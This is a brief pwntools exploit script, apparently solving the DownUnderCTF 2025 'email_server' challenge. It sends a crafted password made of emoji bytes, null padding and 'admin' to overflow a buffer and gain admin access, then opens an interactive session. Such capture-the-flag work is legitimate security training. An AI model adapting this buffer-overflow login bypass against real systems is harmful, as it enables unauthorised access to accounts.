from pwn import p64, ELF, context, log, remote, process

def exploit(reOrNot):
    context.log_level = 'debug'
    if(reOrNot is True):
        r = remote('chal.2025.ductf.net', 30000)
    else:
        context.binary = binary = ELF('./email_server')
        r = process()
    
    r.recvuntil('username: ')

    payload = b'\xf0\x9f\x87\xa6\xf0\x9f\x87\xa9\xf0\x9f\x87\xb2\xf0\x9f\x87\xae\xf0\x9f\x87\xb3' + b'\x00'*12 + b'admin'
    r.sendline(b'AAAA')

    r.recvuntil('password: ')
    r.sendline(payload)

    r.interactive()

exploit(True)